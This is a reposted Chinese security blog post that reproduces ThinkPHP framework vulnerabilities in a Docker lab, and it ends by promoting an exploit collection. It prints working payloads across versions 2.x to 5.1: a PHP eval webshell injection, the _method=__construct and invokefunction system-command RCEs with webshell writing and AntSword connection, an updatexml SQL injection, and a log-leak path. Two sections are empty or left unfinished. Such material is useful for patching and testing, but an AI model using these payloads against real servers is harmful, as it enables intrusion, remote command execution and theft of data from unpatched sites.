<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/59DJy3nUg3JC-Zm0GPFm5A)

![](https://mmbiz.qpic.cn/mmbiz_png/HhnEClSmc37Bxb1zZj7tialnNnk1dnmft6ibz6n2lZaheQClZ7FHjs4RElm391lFKwznAZicyxB8VmZvSSEGHrXHQ/640?wx_fmt=png)

ThinkPHP 介绍

ThinkPHP 是一个快速、兼容而且简单的轻量级国产 PHP 开发框架，诞生于 2006 年初，原名 FCS，2007 年元旦正式更名为 ThinkPHP，遵循 Apache2 开源协议发布，从 Struts 结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和 MVC 模式，融合了 Struts 的思想和 TagLib（标签库）、RoR 的 ORM 映射和 ActiveRecord 模式。

![](https://mmbiz.qpic.cn/mmbiz_png/KLN26icsnib2XYJCRIIHRBibXLekicoWWj63pjFjuYHlBicDncmnjctDfZtAbAodw3tO4bOczk4fxTl7EO5Pq2IM2LA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/fw07L4QCL8zxn8yLTxgxtaKEBOmKyfeXzaxN31SQFNho0f9EIq2uoMDO2O2PzQEJB0sCg2O6oeeyT10sNPHgSQ/640?wx_fmt=png)

漏洞复现

**1、ThinkPHP2.x 远程代码执行漏洞**

ThinkPHP ThinkPHP 2.x 版本中，preg_replace 的 / e 模式匹配路由：

```
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```

导致输入参数被插入双引号中当做代码函数执行，因此造成任意代码执行漏洞。

在 ThinkPHP3.0 的版本中也没有修复此问题。

docker 拉一下 vulfocus 的 thinkphp2 环境，好用又方便

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oARYjuLM1DHJbDQ9aUeCzhDRfbDleENY1pl3gibRRuoJIVd7vxxJwk1g/640?wx_fmt=png)

POC 尝试一波~~

```
/index.php?s=/index/index/aaa/${@phpinfo()}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oQCvdibzM28vCxhNo3cqgvONemyNXUys7TzrwzD1cNQL1csg2W7zJOUg/640?wx_fmt=png)

进一步利用上传连一下马

POC

```
/index.php?s=/index/index/aaa/${${@eval($_POST[pass])\}\}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5o3Lq1GhlHEg4IOyauJZbjSdFrZD1pFc7UWwmYGI2DqNuO5NQR7grjeg/640?wx_fmt=png)

影响范围

ThinkPHP2.x

**2、ThinkPHP3.2.3 SQL 注入漏洞**

**3、ThinkPHP3 日志泄露**

直接访问日志目录，可以看到泄露的日志 thinkphp 日志文件。

```
/Application/Runtime/Logs/Home/21_04_20.log
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oGRyU8iaBQuicW9GTiaZByHtLBehDDZQP71hlujrQN1d0of2qklEOhPwuQ/640?wx_fmt=png)

影响范围

ThinkPHP3.1-3.2

**4、ThinkPHP5.0.23 远程代码执行漏洞**

在 ThinkPHP5.0.23 以前版本中，获取的 method 的方法中没有准确的处理方法名，因此可以调用 request 方法构造利用点。

抓包修改请求方式 POST，POC 利用, 写入 shell.php

POC

```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

写入 shell.php

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oXqPHTEA9OAnuFH4kNksw8WUNaqiaSKMiaEJ7HpVlcOX3dZuV1jzCcZJw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oUXL6INxE7icibGVhzYgEmoGiabblyZlpm6HEMLEKes8SFGKJIy9KJBgvg/640?wx_fmt=png)

蚁剑连一波

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oMh0iclIqdhkRiangNShkcdPbIALuNLSkPdVpiaDfqb8rIuCePQcmL4OIA/640?wx_fmt=png)

影响范围

低于 ThinkPHP5.0.23 版本

**5、ThinkPHP5.0.21 远程命令执行漏洞**

Thinkphp5.x 版本中没有对路由中的控制器进行严格过滤，没有开启强制路由的情况下可以执行系统命令。

漏洞利用路径 poc

```
/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=命令参数
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5ohtwBTSs1nDKbMWh5cfG8Dqlz1p7DvrD399t4eGl1iaX3YAmhHU8oYibg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oCeXeOs4BYHZgaFcI4AIkahXmWTiafVfVzfdtaBw4iaZvhnpB6Tux2q2w/640?wx_fmt=png)

影响范围

5.x < 5.1.31, <= 5.0.23

**6、ThinkPHP5.1.X SQL 注入漏洞**

在 ThinkPHP5.1.23 之前的版本中存在 SQL 注入漏洞，该漏洞是由于程序在处理 order by 后的参数时，未正确过滤处理数组的 key 值所造成。如果该参数用户可控，且当传递的数据为数组时，会导致漏洞的产生。

POC 地址

```
index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1`
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5o1Im9D1j00TqxcouF8mUrb3laVXf2Vop0hic6vKxQmy4cSm4BQSia2UCw/640?wx_fmt=png)

影响范围

ThinkPHP 5.1.X

**6、ThinkPHP6 SQL 注入漏洞**

该漏洞可控制写入文件名与路径，在特定条件下可控制内容，远程执行命令。

因为在 thinkphp6 下 session 是默认关闭的，在这里是需要我们手动开启的，在 app/middleware.php 文件下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oOribbXc3OaaHztv9ctjCzSRVKHNuulj2voyt2XAgGicvM3BZUJw7lxyQ/640?wx_fmt=png)

修改 app

构造 poc

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oiavHyF06W0ME70zpkKlpbicgQXZbDHSjZ11N2R2Nzsia9VqiaoshBz0C6g/640?wx_fmt=png)

最后这里不知道是哪里出了问题创建不了，session 也开了，有哪位大佬帮忙指点一下。

下一章节 thinkphp 漏洞分析

作者：CSDN 博主「bye_X」。

原文链接：https://blog.csdn.net/yangbz123/article/details/115329314

![](https://mmbiz.qpic.cn/mmbiz_png/T1ocbsicpkxBlicibWGmibaDNsxT1LB7mkaT1MLtLoWDxvmInMUN46nXLBdFd0zfhInGE0rKwIStKeFfzKvwj3bucg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XdbJYiapKibnUtaqVr3GWibmicickiaeCv8K4r8jEujtsazVzl2w84hcF15xlfmia2L8iaqT5u6OkqmatIncRytmAPllgQ/640?wx_fmt=png)

获取资源

关注公众号

公众号

回复 “**漏洞**” 获取 中间件漏洞检测利用 EXP 集合

EXP 截图如下  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oGr7xX1HYGG8rIKZssjGWAsOL70qP59icBK3OLlOnAYE8Wj6YBrIyCVg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oaLe9pNwO3oLaMBdmXInr4Hv7YQde7Vj2mgpVIqpPmnj5ooa9tTr86A/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oCY4ibibf6zvVIUznSFOCMyEbSjURfql2vNo1p0iaSq4KXGHb1icJNBh6pA/640?wx_fmt=png)